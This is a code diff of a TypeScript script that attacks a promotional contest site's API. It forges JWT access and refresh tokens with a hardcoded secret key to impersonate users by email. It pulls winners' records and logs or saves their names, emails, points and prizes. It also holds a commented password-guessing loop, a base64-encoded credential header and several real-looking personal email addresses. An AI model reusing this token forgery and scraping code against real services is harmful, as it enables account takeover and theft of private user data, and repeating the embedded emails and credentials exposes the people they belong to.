@@ -64,14 +64,14 @@ function randomBetween(start, end) {
   const values = {};
   const request = new CustomRequest({}, true);
   // const res = await request.get("https://adm.dirolpromo.ru/api/winners?query=&date=2019-05-31&page=1&count=1000").catch(value => <any>console.log(value));
-  const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
-  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100&page=4").catch(value => <any>console.log(value));
-  const data = res.data;
-
-  for (let value of data) {
-    if (!value.client) { continue; }
-    values[value.client.email] = value.client;
-  }
+  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
+  // // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100&page=4").catch(value => <any>console.log(value));
+  // const data = res.data;
+  //
+  // for (let value of data) {
+  //   if (!value.client) { continue; }
+  //   values[value.client.email] = value.client;
+  // }
 
   // for (let i = 1000; i < 10000; ++i) {
   //   let token = Buffer.from('sergeicykalo@yanex.ru:123\'').toString('base64');
@@ -91,13 +91,14 @@ function randomBetween(start, end) {
   //
   //   await sleep(1000);
   // }
-  const keys = Object.keys(values);
-  for (let i = 0; i < keys.length; ++i) {
-    const a = await main(request, keys[i]);
-    if (a) { i--; }
-  }
-  // await main('tataflower@list.ru');
-
+  // const keys = Object.keys(values);
+  // for (let i = 0; i < keys.length; ++i) {
+  //   const a = await main(request, keys[i]);
+  //   if (a) { i--; }
+  // }
+  await main(request, 'amitova.1992@mail.ru');
+  //yanayastrebova@mail.ru
+  //255857@list.ru
 
   // const a = await fetch("https://adm.dirolpromo.ru/api/auth", {"credentials":"include","headers":{"accept":"application/json, text/plain, */*","accept-language":"uk,ru;q=0.9,en;q=0.8","authorization":"dmFsaW1wZXRyb3YxOTkzQGdtYWlsLmNvbTo2MTIx","cache-control":"no-cache","content-type":"application/json;charset=UTF-8","pragma":"no-cache"},"referrer":"https://dirolpromo.ru/","referrerPolicy":"no-referrer-when-downgrade","body":"{}","method":"POST","mode":"cors"});
 
@@ -163,15 +164,15 @@ function randomBetween(start, end) {
 
 async function main(request: CustomRequest, email) {
   const secretKey = '[N%"D9&RJ{_A3EkK5`7dkh+%:';
-  const now = Date.now() / 1000 - 400;
+  const now = Date.now() / 1000 - 200;
 
   const token = jwt.sign({ "iss": "Raiffeisen", email, user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
-  // const refreshToken = jwt.sign({ "iss": "Raiffeisen",  user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
-  //
-  //
-  //
-  // const cookieToken = `{%22accessToken%22:%22${token}%22%2C%22refreshToken%22:%22${refreshToken}%22%2C%22expires_in%22:1555012608}`;
-  // console.log(cookieToken);
+  const refreshToken = jwt.sign({ "iss": "Raiffeisen",  user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
+
+
+
+  const cookieToken = `{%22accessToken%22:%22${token}%22%2C%22refreshToken%22:%22${refreshToken}%22%2C%22expires_in%22:1555012608}`;
+  console.log(cookieToken);
   // return;
   // console.log(cookieToken);
   // return;
@@ -189,10 +190,11 @@ async function main(request: CustomRequest, email) {
     // console.log('3', json)
     if (!json.client) { return true }
     fetch("https://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
-      .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));
+      // .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));
+      .then(value => console.log(`${json.client.email}. Prizes: ${JSON.stringify(value)}`));
 
     console.log(`${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
-    FS.appendFileSync('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}` + '\n');
+    // FS.appendFileSync('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}` + '\n');
   } catch (e) {
     console.log(e)
   }
